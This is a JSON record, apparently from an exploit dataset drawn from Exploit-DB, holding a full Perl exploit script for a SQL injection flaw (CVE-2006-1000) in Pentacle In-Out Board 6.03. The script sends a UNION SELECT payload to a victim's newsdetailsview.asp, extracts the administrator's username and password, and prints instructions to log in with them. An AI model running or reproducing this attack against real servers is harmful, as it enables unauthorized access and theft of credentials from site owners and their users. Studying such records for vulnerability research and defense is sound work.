{
  "id": "1528",
  "title": "Pentacle In-Out Board 6.03 - &#039;newsdetailsview&#039; SQL Injection",
  "cve": "CVE-2006-1000",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#Method found & Exploit scripted by nukedx\r\n#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com\r\n#Usage: penta.pl <victim> <directory>\r\n#Original Advisory: http://www.nukedx.com/?viewdoc=14\r\nuse IO::Socket;\r\nif(@ARGV < 3){\r\nprint \"\r\n+***********************************************************************+\r\n+Pentacle In-Out Board <= 6.03 (newsdetailsview.asp) Remote SQL-Inj. XPL+\r\n+                Usage: penta.pl <victim> <directory> <userid>          +\r\n+                       Example: penta.pl sux.com / 1                   +\r\n+                 Method found & Exploit scripted by nukedx             +\r\n+***********************************************************************+\r\n\";\r\nexit();\r\n}\r\n#Local variables\r\n$pentaserver = $ARGV[0];\r\n$pentaserver =~ s/(http:\\/\\/)//eg;\r\n$pentahost = \"http://\".$pentaserver;\r\n$port = \"80\";\r\n$pentadir = $ARGV[1];\r\n$pentaid  = $ARGV[2];\r\n$pentatar = \"newsdetailsview.asp?newsid=\";\r\n$pentafinal = \"login.asp\";\r\n$pentaxp = \"11%20union%20select%200,userpassword,0,username,0,0,0,0%20from%20pt_users%20where%20userid=\".$pentaid.\"%20and%20useradmin=yes\";\r\n$pentareq = $pentahost.$pentadir.$pentatar.$pentaxp;\r\n#Writing data to socket\r\nprint \"+**********************************************************************+\\n\";\r\nprint \"+ Trying to connect: $pentaserver\\n\";\r\n$penta = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$pentaserver\", PeerPort => \"$port\") || die \"\\n+ Connection failed...\\n\";\r\nprint $penta \"GET $pentareq\\n\";\r\nprint $penta \"Host: $pentaserver\\n\";\r\nprint $penta \"Accept: */*\\n\";\r\nprint $penta \"Connection: close\\n\\n\";\r\nprint \"+ Connected!...\\n\";\r\nwhile($answer = <$penta>) {\r\nif ($answer =~ /class=\\\"newsdetailtitle\\\">(.*?)<\\/td>/){ \r\nprint \"+ Exploit succeed! Getting USERID: $pentaid admin login information.\\n\";\r\nprint \"+ ---------------- +\\n\";\r\nprint \"+ USERNAME: $1\\n\";\r\n}\r\nif ($answer =~ /<td align=\\\"right\\\" class=\\\"style9px\\\">(.*?)&nbsp;/) { \r\nprint \"+ PASSWORD: $1\\n\";\r\nprint \"+ ---------------- +\\n\";\r\nprint \"+ Lets go $pentahost$pentadir$pentafinal and\\n+ Login with this information. \\n\";\r\nprint \"+**********************************************************************+\\n\";\r\nexit(); \r\n}\r\nif ($answer =~ /Internal Server Error/) { \r\nprint \"+ This version of Pentacle In-Out Board is vulnerable too but default query of SQL-inject doesnt work on it\\n\";\r\nprint \"+ So please edit query by manually adding or removing null datas..\\n\";\r\nprint \"+**********************************************************************+\\n\";\r\nexit(); \r\n}\r\nif ($answer =~ /number of columns/) { \r\nprint \"+ This version of Pentacle In-Out Board is vulnerable too but default query of SQL-inject doesnt work on it\\n\";\r\nprint \"+ So please edit query by manually adding or removing null datas..\\n\";\r\nprint \"+**********************************************************************+\\n\";\r\nexit(); \r\n}\r\n}\r\nprint \"+ Try another userid maybe this one not the admin.\\n\";\r\nprint \"+ Exploit failed :(\\n\";\r\nprint \"+**********************************************************************+\\n\";\r\n\r\n# nukedx.com [2006-02-25]\r\n\r\n# milw0rm.com [2006-02-25]",
  "url": "https://www.exploit-db.com/exploits/1528"
}